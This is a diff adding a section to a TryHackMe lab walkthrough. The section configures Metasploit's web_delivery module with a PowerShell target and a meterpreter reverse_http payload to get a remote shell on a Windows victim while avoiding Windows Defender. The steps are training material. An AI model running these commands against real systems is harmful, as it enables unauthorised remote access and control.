@@ -161,6 +161,46 @@ Go to the directory by command `cd c:\Users\Administrator\Desktop` and then see 
 
 <img width="489" height="234" alt="image" src="https://github.com/user-attachments/assets/e0bf4d7a-1971-4a90-80a3-1d1c818bacd4" />
 
+## Adoption into the Collective
+
+### Answer the questions below
+
+1. Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
+
+Open a new session in your terminal and type `msfconsole` to launch Metasploit.
+
+<img width="432" height="338" alt="image" src="https://github.com/user-attachments/assets/7a53f655-9c20-4d77-96cb-e75f057ca7c3" />
+
+Select the payload by command: `use exploit/multi/script/web_delivery`
+
+<img width="305" height="38" alt="image" src="https://github.com/user-attachments/assets/615c9720-4c0d-41a1-bddc-376070c4bfd5" />
+
+2. First, let's set the target to PSH (PowerShell). Which target number is PSH?
+
+Command: `show targets` and answer is 2.
+
+<img width="275" height="194" alt="image" src="https://github.com/user-attachments/assets/1adb2b25-2431-4969-9997-e60ad29bf19a" />
+
+Set your target: `set target 2`
+
+<img width="275" height="27" alt="image" src="https://github.com/user-attachments/assets/611a3158-1df4-4aeb-8518-a93a7379e29b" />
+
+Metasploit can generate different types of payloads, so we will create a PowerShell Command that downloads or executes the payload directly in memory and PowerShell is already installed on most Windows systems.
+
+3. After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.
+
+Check your tun0 IP address by command `ifconfig` then set your LHOST by `set LHOST TUN0_IP` and LPORT is already set to `4444`
+
+<img width="676" height="52" alt="image" src="https://github.com/user-attachments/assets/999ec14e-ad62-487c-8f72-3ba64981747a" />
+
+<img width="763" height="633" alt="image" src="https://github.com/user-attachments/assets/5234e007-575c-45d7-9ded-da345e40103d" />
+
+4. Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.
+
+
+
+
+
 
 
 
